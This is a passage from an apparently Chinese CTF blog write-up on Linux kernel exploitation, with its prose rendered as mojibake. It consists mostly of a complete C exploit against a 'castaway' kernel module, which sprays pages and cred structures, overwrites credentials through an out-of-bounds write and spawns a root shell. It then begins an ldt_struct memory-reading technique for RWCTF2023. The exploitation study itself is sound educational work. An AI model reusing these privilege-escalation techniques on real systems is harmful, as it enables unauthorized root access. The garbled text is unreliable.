class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span> &#123;</span><br>    TPACKET_V1,<br>    TPACKET_V2,<br>    TPACKET_V3,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">castaway_request</span> &#123;</span><br>    <span class="hljs-type">int64_t</span> index;<br>    <span class="hljs-type">size_t</span>	size;<br>    <span class="hljs-type">void</span> 	*buf;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page_request</span> &#123;</span><br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-type">int</span> cmd;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    CMD_ALLOC_PAGE,<br>    CMD_FREE_PAGE,<br>    CMD_EXIT,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">timer</span> =</span> &#123;<br>    .tv_sec = <span class="hljs-number">1145141919</span>,<br>    .tv_nsec = <span class="hljs-number">0</span>,<br>&#125;;<br><br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> cmd_pipe_req[<span class="hljs-number">2</span>], cmd_pipe_reply[<span class="hljs-number">2</span>], check_root_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">char</span> bin_sh_str[] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><span class="hljs-type">char</span> *shell_args[] = &#123; bin_sh_str, <span class="hljs-literal">NULL</span> &#125;;<br><span class="hljs-type">char</span> child_pipe_buf[<span class="hljs-number">1</span>];<br><span class="hljs-type">char</span> root_str[] = <span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root.\n&quot;</span><br>                  <span class="hljs-string">&quot;\033[34m[*] Execve root shell now...\033[0m\n&quot;</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">alloc</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ioctl(dev_fd, <span class="hljs-number">0xCAFEBABE</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">(<span class="hljs-type">int64_t</span> index, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">castaway_request</span> <span class="hljs-title">r</span> =</span> &#123;<br>        .index = index,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br><br>    ioctl(dev_fd, <span class="hljs-number">0xF00DBABE</span>, &amp;r);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">waiting_for_root_fn</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span><br>&#123;<br>    <span class="hljs-comment">/* we&#x27;re using the same stack for them, so we need to avoid cracking it.. */</span><br>    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rax, [check_root_pipe]; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rdi, rdi; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov edi, dword ptr [rax]; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rsi, child_pipe_buf; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rdx, 1;   &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rax, rax; &quot;</span> <span class="hljs-comment">/* read(check_root_pipe[0], child_pipe_buf, 1)*/</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall;      &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 102; &quot;</span> <span class="hljs-comment">/* getuid() */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   cmp rax, 0; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   jne failed; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rdi, 1; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rsi, [root_str]; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rdx, 80; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 1;&quot;</span>    <span class="hljs-comment">/* write(1, root_str, 71) */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rdi, [bin_sh_str];  &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rsi, [shell_args];  &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rdx, rdx;   &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 59;    &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall;        &quot;</span>   <span class="hljs-comment">/* execve(&quot;/bin/sh&quot;, args, NULL) */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;failed: &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rdi, [timer]; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rsi, rsi; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 35; &quot;</span>  <span class="hljs-comment">/* nanosleep() */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall; &quot;</span></span><br><span class="hljs-params">    )</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">unshare_setup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> tmp_fd;<br><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    write(tmp_fd, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getuid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getgid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">create_socket_and_alloc_pages</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd, version;<br>    <span class="hljs-type">int</span> ret;<br><br>    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);<br>    <span class="hljs-keyword">if</span> (socket_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);<br>        ret = socket_fd;<br>        <span class="hljs-keyword">goto</span> err_out;<br>    &#125;<br><br>    version = TPACKET_V1;<br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                     &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>    req.tp_block_size = size;<br>    req.tp_block_nr = nr;<br>    req.tp_frame_size = <span class="hljs-number">0x1000</span>;<br>    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;<br><br>    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> err_setsockopt;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> socket_fd;<br><br>err_setsockopt:<br>    close(socket_fd);<br>err_out:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>__attribute__((naked)) <span class="hljs-type">long</span> <span class="hljs-title function_">simple_clone</span><span class="hljs-params">(<span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> (*fn)(<span class="hljs-type">void</span> *))</span><br>&#123;<br>    <span class="hljs-comment">/* for syscall, it&#x27;s clone(flags, stack, ...) */</span><br>    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot; mov r15, rsi; &quot;</span>   <span class="hljs-comment">/* save the rsi*/</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; xor rsi, rsi; &quot;</span>   <span class="hljs-comment">/* set esp and useless args to NULL */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; xor rdx, rdx; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; xor r10, r10; &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; xor r8, r8;   &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; xor r9, r9;   &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; mov rax, 56;  &quot;</span>   <span class="hljs-comment">/* __NR_clone */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; syscall;      &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; cmp rax, 0;   &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; je child_fn;  &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; ret;          &quot;</span>   <span class="hljs-comment">/* parent */</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;child_fn:      &quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot; jmp r15;      &quot;</span>   <span class="hljs-comment">/* child */</span></span><br><span class="hljs-params">    )</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_ALLOC_PAGE,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> page_request));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">free_page</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page_request</span> <span class="hljs-title">req</span> =</span> &#123;<br>        .idx = idx,<br>        .cmd = CMD_FREE_PAGE,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(cmd_pipe_req[<span class="hljs-number">1</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>    read(cmd_pipe_reply[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spray_cmd_handler</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page_request</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd[PGV_PAGE_NUM];<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-comment">/* create an isolate namespace*/</span><br>    unshare_setup();<br><br>    <span class="hljs-comment">/* handler request */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        read(cmd_pipe_req[<span class="hljs-number">0</span>], &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br><br>        <span class="hljs-keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;<br>            ret = create_socket_and_alloc_pages(<span class="hljs-number">0x1000</span>, <span class="hljs-number">1</span>);<br>            socket_fd[req.idx] = ret;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;<br>            ret = close(socket_fd[req.idx]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);<br>        &#125;<br><br>        write(cmd_pipe_reply[<span class="hljs-number">1</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br>    &#125; <span class="hljs-keyword">while</span> (req.cmd != CMD_EXIT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> aragc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    <span class="hljs-type">char</span> th_stack[<span class="hljs-number">0x1000</span>], buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-comment">/* to run the exp on the specific core only */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/castaway&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open castaway device!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* use a new process for page spraying */</span><br>    pipe(cmd_pipe_req);<br>    pipe(cmd_pipe_reply);<br>    <span class="hljs-keyword">if</span> (!fork()) &#123;<br>        spray_cmd_handler();<br>        <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>    &#125;<br><br>    <span class="hljs-comment">/* make buddy&#x27;s lower order clean, castaway_requesting from higher */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spraying pgv pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_PAGE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span>(alloc_page(i) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at no.%d socket\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to spray pages via socket!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* free pages for cred */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] freeing for cred pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; PGV_PAGE_NUM; i += <span class="hljs-number">2</span>)&#123;<br>        free_page(i);<br>    &#125;<br><br>    <span class="hljs-comment">/* spray cred to get the isolate pages we released before */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spraying cred...&quot;</span>);<br>    pipe(check_root_pipe);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CRED_SPRAY_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, <br>                         waiting_for_root_fn) &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed at cloning %d child\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to clone()!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* free pages for our vulerable objects */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] freeing for vulnerable pages...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PGV_PAGE_NUM; i += <span class="hljs-number">2</span>)&#123;<br>        free_page(i);<br>    &#125;<br><br>    <span class="hljs-comment">/* spray vulnerable objects, hope that we can make an oob-write to cred */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigerring vulnerability in castaway kernel module...&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    *(<span class="hljs-type">uint32_t</span>*) &amp;buf[VUL_OBJ_SIZE - <span class="hljs-number">6</span>] = <span class="hljs-number">1</span>;    <span class="hljs-comment">/* cred-&gt;usage */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; VUL_OBJ_NUM; i++) &#123;<br>        alloc();<br>        edit(i, VUL_OBJ_SIZE, buf);<br>    &#125;<br><br>    <span class="hljs-comment">/* checking privilege in child processes */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] notifying child processes and waiting...&quot;</span>);<br>    write(check_root_pipe[<span class="hljs-number">1</span>], buf, CRED_SPRAY_NUM);<br>    sleep(<span class="hljs-number">1145141919</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ææƒï¼š</p>
<p><img src="https://s2.loli.net/2023/02/02/gSXEF2xm4J5wy8p.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x0A-Kernel-tricks"><a href="#0x0A-Kernel-tricks" class="headerlink" title="0x0A. Kernel tricks"></a>0x0A. Kernel tricks</h1><p>åœ¨å­¦ä¹ äº†ä»¥ä¸Šå†…æ ¸åŸºæœ¬åˆ©ç”¨æŠ€å·§ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°å‘ç° kernel pwn ä¸­çš„ä¸€äº›é€šç”¨ tricks ä¸é€šç”¨è§£æ³•</p>
<h2 id="initramfs-åœ¨å†…å­˜ä¸­ç›´æ¥æœç´¢-flag"><a href="#initramfs-åœ¨å†…å­˜ä¸­ç›´æ¥æœç´¢-flag" class="headerlink" title="initramfs åœ¨å†…å­˜ä¸­ç›´æ¥æœç´¢ flag"></a>initramfs åœ¨å†…å­˜ä¸­ç›´æ¥æœç´¢ flag</h2><p><strong>Initial RAM disk</strong>ï¼ˆ<code>initrd</code>ï¼‰æä¾›äº†åœ¨ boot loader é˜¶æ®µè½½å…¥ä¸€ä¸ª RAM disk å¹¶æŒ‚è½½ä¸ºæ ¹æ–‡ä»¶ç³»ç»Ÿçš„èƒ½åŠ›ï¼Œä»è€Œåœ¨è¯¥é˜¶æ®µè¿è¡Œä¸€äº›ç”¨æˆ·æ€ç¨‹åºï¼Œåœ¨å®Œæˆè¯¥é˜¶æ®µå·¥ä½œä¹‹åæ‰æ˜¯æŒ‚è½½çœŸæ­£çš„æ ¹æ–‡ä»¶ç³»ç»Ÿ</p>
<p>initrd æ–‡ä»¶ç³»ç»Ÿé•œåƒé€šå¸¸ä¸º gzip æ ¼å¼ï¼Œåœ¨å¯åŠ¨é˜¶æ®µç”± boot loader å°†å…¶è·¯å¾„ä¼ ç»™ kernelï¼Œè‡ª 2.6 ç‰ˆæœ¬åå‡ºç°äº†ä½¿ç”¨ cpio æ ¼å¼çš„initramfsï¼Œä»è€Œæ— éœ€æŒ‚è½½ä¾¿èƒ½å±•å¼€ä¸ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ</p>
<p>initrd&#x2F;initramfs çš„ç‰¹ç‚¹ä¾¿æ˜¯<strong>æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šè¢«è¯»å–åˆ°å†…å­˜å½“ä¸­</strong>ï¼Œè€Œå¤§éƒ¨åˆ† CTF ä¸­çš„ kernel pwn é¢˜ç›®éƒ½é€‰æ‹©ç›´æ¥å°† initrd ä½œä¸ºæ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œå› æ­¤è‹¥æ˜¯æˆ‘ä»¬æœ‰ç€å†…å­˜æœç´¢èƒ½åŠ›ï¼Œæˆ‘ä»¬ä¾¿èƒ½<strong>ç›´æ¥åœ¨å†…å­˜ç©ºé—´ä¸­æœç´¢ flag çš„å†…å®¹</strong>ï¼šï¼‰</p>
<h3 id="ä¾‹é¢˜ï¼šRWCTF2023ä½“éªŒèµ›-Digging-into-kernel-3-1"><a href="#ä¾‹é¢˜ï¼šRWCTF2023ä½“éªŒèµ›-Digging-into-kernel-3-1" class="headerlink" title="ä¾‹é¢˜ï¼šRWCTF2023ä½“éªŒèµ› - Digging into kernel 3"></a>ä¾‹é¢˜ï¼šRWCTF2023ä½“éªŒèµ› - Digging into kernel 3</h3><h4 id="â‘ -é¢˜ç›®åˆ†æ-4"><a href="#â‘ -é¢˜ç›®åˆ†æ-4" class="headerlink" title="â‘  é¢˜ç›®åˆ†æ"></a>â‘  é¢˜ç›®åˆ†æ</h4><p>é¢˜ç›®å·²ç»åœ¨å‰é¢åˆ†æè¿‡äº†ï¼Œè¿™é‡Œç¬”è€…å°±ä¸é‡å¤åˆ†æäº†ï¼šï¼‰</p>
<h4 id="â‘¡-æ¼æ´åˆ©ç”¨ï¼šldt-struct-ç›´æ¥è¯»å–-initramfs-å†…å®¹"><a href="#â‘¡-æ¼æ´åˆ©ç”¨ï¼šldt-struct-ç›´æ¥è¯»å–-initramfs-å†…å®¹" class="headerlink" title="â‘¡ æ¼æ´åˆ©ç”¨ï¼šldt_struct ç›´æ¥è¯»å– initramfs å†…å®¹"></a>â‘¡ æ¼æ´åˆ©ç”¨ï¼šldt_struct ç›´æ¥è¯»å– initramfs å†…å®¹</h4><p>æ—¢ç„¶é¢˜ç›®ä¸­å·²ç»ç›´æ¥ç™½ç»™å‡ºäº†ä¸€ä¸ªæ— é™åˆ¶çš„ UAFï¼Œé‚£ä¹ˆåˆ©ç”¨æ–¹å¼å°±æ˜¯å¤šç§å¤šæ ·çš„äº† :-D è¿™é‡Œç¬”è€…é€‰æ‹©åˆ©ç”¨ <a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x03-ldt-struct-%E4%B8%8E-modify-ldt-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">ldt_struct</a> ç›´æ¥åœ¨å†…å­˜ç©ºé—´ä¸­æœç´¢ flag çš„æ–¹å¼è§£é¢˜</p>
<h5 id="Step-I-åˆ©ç”¨-ldt-struct-è¿›è¡Œä»»æ„å†…å­˜è¯»å–"><a href="#Step-I-åˆ©ç”¨-ldt-struct-è¿›è¡Œä»»æ„å†…å­˜è¯»å–" class="headerlink" title="Step.I - åˆ©ç”¨ ldt_struct è¿›è¡Œä»»æ„å†…å­˜è¯»å–"></a>Step.I - åˆ©ç”¨ ldt_struct è¿›è¡Œä»»æ„å†…å­˜è¯»å–</h5><p>ldt å³<strong>å±€éƒ¨æ®µæè¿°ç¬¦è¡¨</strong>ï¼ˆ<strong>Local Descriptor Table</strong>ï¼‰ï¼Œå…¶ä¸­å­˜æ”¾ç€<strong>è¿›ç¨‹çš„</strong>æ®µæè¿°ç¬¦ï¼Œæ®µå¯„å­˜å™¨å½“ä¸­å­˜æ”¾ç€çš„æ®µé€‰æ‹©å­ä¾¿æ˜¯æ®µæè¿°ç¬¦è¡¨ä¸­æ®µæè¿°ç¬¦çš„ç´¢å¼•ï¼Œåœ¨å†…æ ¸ä¸­ä¸ ldt ç›¸å…³è”çš„ç»“æ„ä½“ä¸º <code>ldt_struct</code> ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼Œ <code>entries</code> æŒ‡é’ˆæŒ‡å‘ä¸€å—æè¿°ç¬¦è¡¨çš„å†…å­˜ï¼Œ<code>nr_entries</code> è¡¨ç¤º LDT ä¸­çš„æè¿°ç¬¦æ•°é‡ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ldt_struct</span> &#123;</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Xen requires page-aligned LDTs with special permissions.  This is</span><br><span class="hljs-comment">     * needed to prevent us from installing evil descriptors such as</span><br><span class="hljs-comment">     * call gates.  On native, we could merge the ldt_struct and LDT</span><br><span class="hljs-comment">     * allocations, but it&#x27;s not worth trying to optimize.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">desc_struct</span>    *<span class="hljs-title">entries</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>        nr_entries;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * If PTI is in use, then the entries array is not mapped while we&#x27;re</span><br><span class="hljs-comment">     * in user mode.  The whole array will be aliased at the addressed</span><br><span class="hljs-comment">     * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span><br><span class="hljs-comment">     * and map, and enable a new LDT without invalidating the mapping</span><br><span class="hljs-comment">     * of an older, still-in-use LDT.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">int</span>            slot;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¸»è¦å…³æ³¨è¯¥ç»“æ„ä½“å¦‚ä½•ç”¨ä½œæ¼æ´åˆ©ç”¨ï¼ŒLinux æä¾›äº†ä¸€ä¸ª <code>modify_ldt()</code> ç³»ç»Ÿè°ƒç”¨æ“çºµå½“å‰è¿›ç¨‹çš„ <code>ldt_struct</code> ç»“æ„ä½“ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(modify_ldt, <span 